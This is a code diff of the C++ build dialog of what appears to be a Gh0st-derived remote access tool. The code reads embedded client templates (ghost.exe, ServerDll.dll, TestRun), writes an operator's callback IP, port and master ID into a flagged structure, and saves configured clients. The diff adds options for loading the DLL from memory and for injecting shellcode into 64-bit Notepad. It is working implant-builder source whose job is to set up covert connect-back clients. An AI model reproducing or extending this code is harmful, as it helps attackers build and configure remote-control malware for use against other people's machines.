@@ -7,13 +7,50 @@
 #include "afxdialogex.h"
 #include <io.h>
 
-#define OTHER_ITEM 3
+enum Index
+{
+	IndexTestRun_DLL,
+	IndexTestRun_MemDLL,
+	IndexTestRun_InjSC,
+	IndexGhost,
+	IndexServerDll,
+	OTHER_ITEM
+};
 
 // CBuildDlg 对话框
 
 IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)
 
+std::string GetMasterId();
+
 int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize);
+
+LPBYTE ReadResource(int resourceId, DWORD &dwSize) {
+	dwSize = 0;
+	auto id = resourceId;
+	HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCE(id), "BINARY");
+	if (hResource == NULL) {
+		return NULL;
+	}
+	// 获取资源的大小
+	dwSize = SizeofResource(NULL, hResource);
+
+	// 加载资源
+	HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
+	if (hLoadedResource == NULL) {
+		return NULL;
+	}
+	// 锁定资源并获取指向资源数据的指针
+	LPVOID pData = LockResource(hLoadedResource);
+	if (pData == NULL) {
+		return NULL;
+	}
+	auto r = new BYTE[dwSize];
+	memcpy(r, pData, dwSize);
+
+	return r;
+}
+
 
 CBuildDlg::CBuildDlg(CWnd* pParent)
 	: CDialog(CBuildDlg::IDD, pParent)
@@ -33,8 +70,8 @@ void CBuildDlg::DoDataExchange(CDataExchange* pDX)
 	DDX_Text(pDX, IDC_EDIT_IP, m_strIP);
 	DDX_Text(pDX, IDC_EDIT_PORT, m_strPort);
 	DDX_Control(pDX, IDC_COMBO_EXE, m_ComboExe);
-	DDX_Control(pDX, IDC_COMBO_ENCRYPT, m_ComboEncrypt);
 	DDX_Control(pDX, IDC_STATIC_OTHER_ITEM, m_OtherItem);
+	DDX_Control(pDX, IDC_COMBO_BITS, m_ComboBits);
 }
 
 
@@ -49,152 +86,164 @@ END_MESSAGE_MAP()
 
 void CBuildDlg::OnBnClickedOk()
 {
-	CFile File;
-	char szTemp[MAX_PATH];
-	ZeroMemory(szTemp,MAX_PATH);
-	CString strCurrentPath;
-	CString strFile;
-	CString strSeverFile;
-	BYTE *  szBuffer=NULL;
-	DWORD dwFileSize;
 	UpdateData(TRUE);
+	if (m_strIP.IsEmpty() || atoi(m_strPort) <= 0)
+		return;
+
+	BYTE* szBuffer = NULL;
+	DWORD dwFileSize = 0;
 	int index = m_ComboExe.GetCurSel(), typ=index;
+	int is64bit = m_ComboBits.GetCurSel() == 0;
+	if (index == IndexTestRun_InjSC && !is64bit) {
+		MessageBox("Shellcode 只能向64位记事本注入，注入器也只能是64位!", "提示", MB_ICONWARNING);
+		return;
+	}
+	int startup = Startup_DLL;
 	CString file;
 	switch (index)
 	{
-	case CLIENT_TYPE_DLL:
+	case IndexTestRun_DLL: case IndexTestRun_MemDLL: case IndexTestRun_InjSC:
 		file = "TestRun.exe";
+		typ = index == IndexTestRun_DLL ? CLIENT_TYPE_DLL : CLIENT_TYPE_MEMDLL;
+		startup = std::map<int, int>{ 
+			{IndexTestRun_DLL, Startup_DLL},{IndexTestRun_MemDLL, Startup_MEMDLL},{IndexTestRun_InjSC, Startup_InjSC},
+		}[index];
+		szBuffer = ReadResource(is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86, dwFileSize);
 		break;
-	case CLIENT_TYPE_ONE:
+	case IndexGhost:
 		file = "ghost.exe";
+		typ = CLIENT_TYPE_ONE;
+		szBuffer = ReadResource(is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86, dwFileSize);
 		break;
-	case CLIENT_TYPE_MODULE:
+	case IndexServerDll:
 		file = "ServerDll.dll";
+		typ = CLIENT_TYPE_DLL;
+		szBuffer = ReadResource(is64bit ? IDR_SERVERDLL_X64 : IDR_SERVERDLL_X86, dwFileSize);
 		break;
-	case OTHER_ITEM:
+	case OTHER_ITEM: {
 		m_OtherItem.GetWindowTextA(file);
 		typ = -1;
+		if (file != "未选择文件") {
+			CFile File;
+			File.Open(file, CFile::modeRead | CFile::typeBinary);
+			dwFileSize = File.GetLength();
+			if (dwFileSize > 0) {
+				szBuffer = new BYTE[dwFileSize];
+				File.Read(szBuffer, dwFileSize);
+			}
+			File.Close();
+		}
+		break;
+	}
 	default:
 		break;
 	}
-	if (file.IsEmpty() || file == "未选择文件")
+	if (szBuffer == NULL)
 	{
-		MessageBox("无效输入参数, 请重新生成服务!");
-		return CDialog::OnOK();
+		MessageBox("出现内部错误，请检查输入，重新编译程序!", "提示", MB_ICONWARNING);
+		return;
 	}
 	//////////上线信息//////////////////////
-	CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", 0, typ};
+	CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "", typ, false, DLL_VERSION, 0, startup };
 	g_ConnectAddress.SetServer(m_strIP, atoi(m_strPort));
 
-	if (!g_ConnectAddress.IsValid())
+	if (!g_ConnectAddress.IsValid()) {
+		SAFE_DELETE_ARRAY(szBuffer);
 		return;
+	}
 	try
 	{
-		//此处得到未处理前的文件名
-		char path[_MAX_PATH], *p = path;
+		// 更新标识
+		char* ptr = (char*)szBuffer, *end = (char*)szBuffer + dwFileSize;
+		bool bFind = false;
+		int bufSize = dwFileSize;
+		while (ptr < end) {
+			int iOffset = MemoryFind(ptr, (char*)g_ConnectAddress.Flag(), bufSize, g_ConnectAddress.FlagLen());
+			if (iOffset == -1)
+				break;
+
+			CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(ptr + iOffset);
+			auto result = strlen(dst->szBuildDate) ? compareDates(dst->szBuildDate, g_ConnectAddress.szBuildDate) : -1;
+			if (result != -2 && result <= 0)// 客户端版本不能不大于主控端
+			{
+				bFind = true;
+				auto master = GetMasterId();
+				memcpy(ptr + iOffset, &(g_ConnectAddress.ModifyFlag(master.c_str())), sizeof(g_ConnectAddress));
+			}
+			ptr += iOffset + sizeof(g_ConnectAddress);
+			bufSize -= iOffset + sizeof(g_ConnectAddress);
+		}
+		if (!bFind) {
+			MessageBox("出现内部错误，未能找到标识信息!\r\n" + file, "提示", MB_ICONWARNING);
+			SAFE_DELETE_ARRAY(szBuffer);
+			return;
+		}
+
+		// 保存文件
+		char path[_MAX_PATH], * p = path;
 		GetModuleFileNameA(NULL, path, sizeof(path));
 		while (*p) ++p;
 		while ('\\' != *p) --p;
-		strcpy(p+1, file.GetString());
+		strcpy(p + 1, file.GetString());
 
-		strFile = typ != -1 ? path : file; //得到当前未处理文件名
-		if (_access(strFile, 0) == -1)
-		{
-			MessageBox(CString(strFile) + "\r\n进程模板\"" + file + "\"不存在!");
-			return CDialog::OnOK();
-		}
-		
-		//打开文件
-		File.Open(strFile,CFile::modeRead|CFile::typeBinary);
-		
-		dwFileSize=File.GetLength();
-		szBuffer=new BYTE[dwFileSize];
-		ZeroMemory(szBuffer,dwFileSize);
-		//读取文件内容
-		
-		File.Read(szBuffer,dwFileSize);
-		File.Close();
-		//写入上线IP和端口 主要是寻找0x1234567这个标识然后写入这个位置
-		int iOffset = MemoryFind((char*)szBuffer,(char*)g_ConnectAddress.Flag(),dwFileSize, g_ConnectAddress.FlagLen());
-		if (iOffset==-1)
-		{
-			MessageBox(CString(path) + "\r\n进程模板\"" + file + "\"不支持!");
-			return;
-		}
-		if (MemoryFind((char*)szBuffer + iOffset + sizeof(sizeof(g_ConnectAddress)), (char*)g_ConnectAddress.Flag(),
-			dwFileSize - iOffset - sizeof(g_ConnectAddress), g_ConnectAddress.FlagLen()) != -1) {
-			MessageBox(CString(path) + "\r\n进程模板\"" + file + "\"有问题!");
-			return;
-		}
-		memcpy(szBuffer+iOffset,&g_ConnectAddress,sizeof(g_ConnectAddress));
-		//保存到文件
-		if (index == CLIENT_TYPE_MODULE)
-		{
-			strcpy(p + 1, "ClientDemo.dll");
-		}
-		else {
-			strcpy(p + 1, "ClientDemo.exe");
-		}
-		strSeverFile = typ != -1 ? path : file;
+		CString strSeverFile = typ != -1 ? path : file;
 		DeleteFileA(strSeverFile);
+		CFile File;
 		BOOL r=File.Open(strSeverFile,CFile::typeBinary|CFile::modeCreate|CFile::modeWrite);
 		if (!r) {
-			MessageBox(strSeverFile + "\r\n服务程序\"" + strSeverFile + "\"创建失败!");
-			return CDialog::OnOK();
+			MessageBox("服务程序创建失败!\r\n" + strSeverFile, "提示", MB_ICONWARNING);
+			SAFE_DELETE_ARRAY(szBuffer);
+			return;
 		}
-		Encrypt(szBuffer, dwFileSize, m_ComboEncrypt.GetCurSel());
 		File.Write(szBuffer, dwFileSize);
 		File.Close();
-		delete[] szBuffer;
-		MessageBox("生成成功!文件位于:\r\n"+ strSeverFile);
+		CString tip = index == IndexTestRun_InjSC ? "\r\n提示: 记事本只能连接本机6543端口。" :
+			index == IndexTestRun_DLL ? "\r\n提示: 请生成\"ServerDll.dll\"，以便程序正常运行。" : "";
+		MessageBox("生成成功! 文件位于:\r\n"+ strSeverFile + tip, "提示", MB_ICONINFORMATION);
+		SAFE_DELETE_ARRAY(szBuffer);
+		if (index == IndexTestRun_DLL) return;
 	}
 	catch (CMemoryException* e)
 	{
-		MessageBox("内存不足!");
+		char err[100];
+		e->GetErrorMessage(err, sizeof(err));
+		MessageBox("内存异常:" + CString(err), "异常", MB_ICONERROR);
 	}
 	catch (CFileException* e)
 	{
-		MessageBox("文件操作错误!");
+		char err[100];
+		e->GetErrorMessage(err, sizeof(err));
+		MessageBox("文件异常:" + CString(err), "异常", MB_ICONERROR);
 	}
 	catch (CException* e)
 	{
-		MessageBox("未知错误!");
+		char err[100];
+		e->GetErrorMessage(err, sizeof(err));
+		MessageBox("其他异常:" + CString(err), "异常", MB_ICONERROR);
 	}
+
+	SAFE_DELETE_ARRAY(szBuffer);
 	CDialog::OnOK();
 }
-
-int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize)   
-{   
-	int i,j;   
-	if (iKeySize == 0||iBufferSize==0)
-	{
-		return -1;
-	}
-	for (i = 0; i < iBufferSize; ++i)   
-	{   
-		for (j = 0; j < iKeySize; j ++)   
-			if (szBuffer[i+j] != Key[j])	break;
-		if (j == iKeySize) return i;   
-	}   
-	return -1;   
-}
-
 
 BOOL CBuildDlg::OnInitDialog()
 {
 	CDialog::OnInitDialog();
 
 	// TODO:  在此添加额外的初始化
-	m_ComboExe.InsertString(CLIENT_TYPE_DLL, "TestRun.exe");
-	m_ComboExe.InsertString(CLIENT_TYPE_ONE, "ghost.exe");
-	m_ComboExe.InsertString(CLIENT_TYPE_MODULE, "ServerDll.dll");
+	m_ComboExe.InsertString(IndexTestRun_DLL, "TestRun - 磁盘DLL");
+	m_ComboExe.InsertString(IndexTestRun_MemDLL, "TestRun - 内存DLL");
+	m_ComboExe.InsertString(IndexTestRun_InjSC, "TestRun - 注入记事本");
+
+	m_ComboExe.InsertString(IndexGhost, "ghost.exe");
+	m_ComboExe.InsertString(IndexServerDll, "ServerDll.dll");
 	m_ComboExe.InsertString(OTHER_ITEM, CString("选择文件"));
 	m_ComboExe.SetCurSel(0);
 
-	m_ComboEncrypt.InsertString(0, "无");
-	m_ComboEncrypt.InsertString(1, "XOR");
-	m_ComboEncrypt.SetCurSel(0);
-	m_ComboEncrypt.EnableWindow(FALSE);
+	m_ComboBits.InsertString(0, "64位");
+	m_ComboBits.InsertString(1, "32位");
+	m_ComboBits.SetCurSel(0);
+
 	m_OtherItem.ShowWindow(SW_HIDE);
 
 	return TRUE;  // return TRUE unless you set the focus to a control
